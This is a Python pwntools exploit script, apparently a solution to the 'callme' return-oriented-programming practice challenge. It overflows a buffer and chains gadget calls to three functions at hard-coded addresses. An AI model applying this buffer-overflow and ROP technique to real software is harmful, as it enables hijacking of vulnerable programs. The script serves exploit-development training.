import struct
from pwn import *

# Setting up the process
elf = ELF("./callme")
p = elf.process()

# Addresses
callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810
useful_gadget = 0x401ab0

# Payload
buf = ""
buf += 'A'*40
# First call
buf += struct.pack("<Q", useful_gadget)
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", 0x2)
buf += struct.pack("<Q", 0x3)
buf += struct.pack("<Q", callme_one)
# Second call
buf += struct.pack("<Q", useful_gadget)
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", 0x2)
buf += struct.pack("<Q", 0x3)
buf += struct.pack("<Q", callme_two)
# Third call
buf += struct.pack("<Q", useful_gadget)
buf += struct.pack("<Q", 0x1)
buf += struct.pack("<Q", 0x2)
buf += struct.pack("<Q", 0x3)
buf += struct.pack("<Q", callme_three)

# Send Payload
p.recvuntil("> ")
p.send(buf+'\n')
print p.recv()

